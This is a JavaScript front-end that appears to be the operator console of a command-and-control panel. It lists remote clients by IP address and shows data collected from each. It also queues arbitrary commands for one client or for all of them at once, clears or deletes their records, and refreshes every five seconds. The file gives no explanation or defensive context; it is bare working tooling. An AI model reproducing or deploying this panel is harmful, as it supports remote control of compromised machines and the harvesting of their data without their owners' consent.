
var ctrl = 'ctrl.php';

var l_users = [];
var l_times = [];
var l_selected = -1;

var $selected_user = null;
var $users = null;
var $cmd = null;
var $cmds = null;
var $data = null;
var $log = null;
var $run_selected = null;

function log(msg) {
	$log.get(0).value += msg + '\n';
	$log.scrollTop($log[0].scrollHeight);
}
function refresh_users() {

	select_user(-1);

	$.ajax({
		type: 'POST',
		url: ctrl,
		cache: false,
		dataType: 'json',
		data: {req : 'get_users'}
	})
	.done(function(data) {
		l_users = [];
		l_times = [];
		$users.empty();
		for (var i = 0; i < data.length; i++) {
			l_users.push(data[i][0]);
			l_times.push(data[i][1]);
			$users.append($('<tr></tr>')
				.append('<td><button onclick="select_user('+i+');">' + l_users[i] + '</button></td>')
				.append('<td>' + l_times[i] + '</td>')
				//.append('<td><button onclick="get_data('+i+')">Show Data</button></td>')
				//.append('<td><button onclick="view_cmds('+i+')">View Commands</button></td>')
				.append('<td><button onclick="clear_cmds('+i+')">Clear Commands</button></td>')
				.append('<td><button onclick="clear_data('+i+')">Clear Data</button></td>')
				.append('<td><button onclick="del_data('+i+')">Delete User</button></td>'));
		}
		log('Fetched ' + l_users.length + ' IP addresses.');
	});
}

function select_user(index) {
	l_selected = index;
	
	$users.find('tr').removeClass('highlight');
	
	if (index >= 0) {
		$users.find('tr').eq(index).addClass('highlight');
		$run_selected.text('Add for ' + l_users[index]).removeAttr('disabled');
		get_data(index);
		view_cmds(index);
	} else {
		$run_selected.attr('disabled', 'disabled');
		$data.val('');
		$cmds.val('');
	}
}
function get_data(index) {
	generic_request(index, 'get_data', function(data) {
		$data.val(data);
		$data.scrollTop($data[0].scrollHeight);
		log('Fetched data for ' + l_users[index]);
	});
}
function clear_data(index) {
	generic_request(index, 'clear_data', function(data) {
		log('Cleared data for ' + l_users[index]);
		if (l_selected == index) {
			$data.val('');
		}
	});
}
function view_cmds(index) {
	generic_request(index, 'get_cmd', function(data) {
		$cmds.val(data);
		$cmds.scrollTop($cmds[0].scrollHeight);
		log('Fetched commands for ' + l_users[index]);
	});
}
function clear_cmds(index) {
	generic_request(index, 'clear_cmd', function(data) {
		log('Cleared commands for ' + l_users[index]);
		if (l_selected == index) {
			$cmds.val('');
		}
	});
}
function del_data(index) {
	if(!confirm('Are you sure?'))
		return;

	generic_request(index, 'del_data', function(data) {
		log('Deleted data for ' + l_users[index]);
		if (l_selected == index) {
			$data.val('');
			$cmds.val('');
		}
		refresh_users();
	});
}
function generic_request(index, req, success) {
	$.ajax({
		type: 'POST',
		url: ctrl,
		cache: false,
		dataType: 'text',
		data: {req : req, user: l_users[index]}
	})
	.done(success);
}
function run_all() {
	run(-1);
}
function run_selected() {
	if (l_selected < 0) {
		$data.val('No user selected.');
	} else {
		run(l_selected);
	}
}
function run(index) {
	var cmd = $cmd.val();
	if (cmd.length == 0)
		return;
		
	$cmd.val('');
	
	var data = null;
	if (index < 0) {
		data = {req : 'put_cmd_all', cmd: cmd};
	} else {
		data = {req : 'put_cmd', cmd: cmd, user: l_users[index]};
	}
	
	$.ajax({
		type: 'POST',
		url: ctrl,
		cache: false,
		dataType: 'text',
		data: data
	})
	.done(function(data) {
		log('Executed command for '
			+ (index < 0 ? 'ALL' : l_users[index])
			+ '. ' + data);
	});
}

$(document).ready(function() {
	$selected_user = $('#selected_user');
	$users = $('#users');
	$cmd = $('#cmd');
	$data = $('#data');
	$cmds = $('#cmds');
	$log = $('#log');
	$run_selected = $('#run_selected');
	
	refresh_users();
	
	setInterval(function() {
		if (l_selected >= 0) {
			select_user(l_selected);
		}
	}, 5000);
});